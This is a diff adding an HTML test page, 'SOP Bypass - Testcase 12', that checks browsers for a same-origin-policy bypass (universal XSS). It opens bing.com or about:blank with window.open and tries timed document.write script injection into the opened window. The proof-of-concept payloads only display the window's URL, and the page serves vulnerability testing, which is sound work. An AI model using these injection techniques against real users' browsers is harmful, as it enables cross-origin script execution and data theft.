@@ -1,0 +1,113 @@
+
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 120%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+<script>
+
+function sop1(){
+  	w = window.open('http://www.bing.com', '_blank');
+  	w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
+ 
+
+  }
+  
+  
+function sop2(){
+  	w = window.open('http://www.bing.com', '_blank');
+  	setTimeout(function(){ w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
+ }, 5000);
+	
+
+  }
+  
+  
+  function sop3(){
+  	w = window.open('about:blank', '_blank');
+	setTimeout(function(){ w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
+ }, 5000); 
+
+  }
+  
+  
+  
+  function sop4(){
+        
+		w = window.open('location.href', '_blank');
+        w.document.write("<body><script>location.href = 'http://www.bing.com';<\/script>");
+		setTimeout(function(){ w.document.write("<body><script>document.body.innerHTML=location.href;<\/script>");
+ }, 9000);
+  }
+  
+</script>
+
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 12</h3>	
+
+		<div class="main">
+				<p>Testing for SOP bypass using window.open function and race condition <p>
+		</div>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case 1" onclick="sop1()" /></center>
+	</br>	<center>	<input type="button" id="btn_test" class="test" value="Run Test Case 2" onclick="sop2()" /></center>
+	</br>	<center>	<input type="button" id="btn_test" class="test" value="Run Test Case 3" onclick="sop3()" /></center>
+		</br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 4" onclick="sop4()" /></center>
+
+		</br></br>
+			<div class="note">
+			
+				<p><strong>Note:</strong> <br />
+					If page loads popup and displays bing.com in browser tab, your browser is vulnerable to SOP bypass
+</br>Please note that, if the address bar is about:blank, browser is safe. 
+
+</br>Test Cases Adapted from https://ios.browsr-tests.com</br>				
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
